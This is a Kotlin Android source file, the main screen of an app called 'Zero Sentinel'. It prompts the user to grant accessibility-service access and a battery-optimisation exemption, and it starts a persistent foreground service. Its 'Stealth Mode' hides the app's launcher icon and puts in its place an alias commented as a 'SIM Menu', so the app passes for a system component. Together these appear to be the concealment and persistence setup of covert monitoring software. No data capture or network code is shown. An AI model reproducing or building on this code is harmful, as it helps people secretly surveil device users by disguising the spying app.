package com.zero.sentinel.ui

import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.zero.sentinel.R
import com.zero.sentinel.services.SentinelAccessibilityService

import android.content.ComponentName
import android.content.pm.PackageManager
import android.net.Uri
import android.os.PowerManager
import android.view.View

class MainActivity : AppCompatActivity() {

    private lateinit var statusText: TextView
    private lateinit var enableButton: Button
    private lateinit var batteryButton: Button
    private lateinit var stealthButton: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        statusText = findViewById(R.id.tv_status)
        enableButton = findViewById(R.id.btn_enable_accessibility)
        batteryButton = findViewById(R.id.btn_ignore_battery)
        stealthButton = findViewById(R.id.btn_enable_stealth)

        // 1. Accessibility
        enableButton.setOnClickListener {
            if (!isAccessibilityServiceEnabled()) {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                startActivity(intent)
                Toast.makeText(this, "Find 'Zero Sentinel' and enable it.", Toast.LENGTH_LONG).show()
            }
        }

        // 2. Battery Optimization
        batteryButton.setOnClickListener {
            requestBatteryOptimization()
        }

        // 3. Stealth Mode
        stealthButton.setOnClickListener {
            enableStealthMode()
        }
        
        // Start Foreground Service immediately if possible
        startService(Intent(this, com.zero.sentinel.services.SentinelService::class.java))
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
    }

    private fun updateStatus() {
        // Check Accessibility
        if (isAccessibilityServiceEnabled()) {
            enableButton.isEnabled = false
            enableButton.text = "Service Enabled ✅"
        } else {
            enableButton.isEnabled = true
        }

        // Check Battery
        if (isIgnoringBatteryOptimizations()) {
            batteryButton.isEnabled = false
            batteryButton.text = "Battery Ignored ✅"
        } else {
            batteryButton.isEnabled = true
        }

        statusText.text = "Setup Status: ${if (enableButton.isEnabled) "Incomplete" else "Ready"}"
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
        for (service in enabledServices) {
            if (service.id.contains(packageName) && service.id.contains(SentinelAccessibilityService::class.java.simpleName)) {
                return true
            }
        }
        return false
    }

    private fun isIgnoringBatteryOptimizations(): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun requestBatteryOptimization() {
        if (!isIgnoringBatteryOptimizations()) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
        }
    }

    private fun enableStealthMode() {
        val pm = packageManager
        val componentName = ComponentName(this, MainActivity::class.java)
        val aliasName = ComponentName(this, "com.zero.sentinel.ui.StealthAlias")

        // Enable Alias (SIM Menu)
        pm.setComponentEnabledSetting(
            aliasName,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )

        // Disable Main Activity (Zero Sentinel)
        pm.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )

        Toast.makeText(this, "Stealth Mode Activated. App will close.", Toast.LENGTH_LONG).show()
        finish()
    }
}
